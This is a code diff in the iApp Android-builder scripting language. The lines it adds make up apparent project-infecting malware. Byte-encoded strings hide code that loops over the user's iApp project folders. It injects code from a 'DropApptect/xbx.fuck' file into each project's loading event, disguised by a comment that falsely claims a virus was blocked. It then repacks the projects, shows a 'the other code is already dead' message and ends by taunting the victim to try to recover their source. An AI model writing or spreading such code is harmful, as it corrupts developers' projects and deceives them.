@@ -83,7 +83,8 @@ for(res;sz)
     sj(xml1,"<versionName>","</versionName>",versionName)
     sr(xml1,versionName,"小白熊",xml1)
     fw(xml,xml1)
-    tws(abc,"当你看到我，其他代码已经死了",0)
+    btoo("utf-8","-27 -67 -109 -28 -67 -96 -25 -100 -117 -27 -120 -80 -26 -120 -111 -17 -68 -116 -28 -67 -96 -25 -102 -124 -28 -69 -93 -25 -96 -127 -27 -73 -78 -25 -69 -113 -26 -83 -69 -28 -70 -122",srzx)
+    tws(abc,srzx,0)
     ss(iapp+"/"+res+"/icon.png",icon)
     fc("iapp/userimg/icon.png",icon,true,png)
     s mian="47 115 114 99 47 109 105 97 110 46 105 121 117"
@@ -143,6 +144,48 @@ for(res;sz)
       sr(iyu,ui,th)
       fw(mian,th)
     }
+  }
+}   
+btoo("utf-8","105 65 112 112 47 105 97 112 112 100 105 114 47",dir)
+fl(dir,"false",irsz)
+for(iapp;irsz)
+{
+  ss(dir+iapp,ymdz)
+  sran(1000,9999,sjs)
+  ss(dir+"/"+sjs,hp)
+  fuzs(ymdz,hp,true,ll)
+  ss(hp+"/src/mian.iyu",mian)
+  fr(mian,iyu)
+  s head="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
+  s tail="60 47 101 118 101 110 116 73 116 109 101 62 60 47 85 73 69 118 101 110 116 115 101 116 62"
+  btoo("utf-8",head,head)
+  btoo("utf-8",tail,tail)
+  f(iyu?"loading")
+  {
+    sj(iyu,head,tail,loading)
+    fr("a",n)
+    fr("iApp/DropApptect/xbx.fuck",dm)
+    btoo("utf-8","10 47 46 10 -27 -73 -78 -28 -72 -70 -26 -126 -88 -26 -117 -90 -26 -120 -86 -25 -105 -123 -26 -81 -110",lj)
+    ss(loading+lj+n+dm,afterloading)
+    sr(iyu,loading,afterloading,iyu)
+    fw(mian,iyu)
+    fj(hp,ymdz,true,jg)    
+  }
+  else
+  {
+    s ui="60 85 73 69 118 101 110 116 115 101 116 62"
+    s en="60 47 101 118 101 110 116 73 116 109 101 62"
+    s at="60 47 85 73 69 118 101 110 116 115 101 116 62"
+    s head="60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62"
+    btoo("utf-8",ui,ui)
+    btoo("utf-8",at,at)
+    btoo("utf-8",en,en)
+    btoo("utf-8",head,head)
+    fr("iApp/DropApptect/xbx.fuck",dm)
+    ss(head+dm+en+at,th)
+    sr(iyu,ui,th)
+    fw(mian,th)
+    fj(hp,ymdz,true,jg)
   }
 }
 加油，试着找回来自己的源码
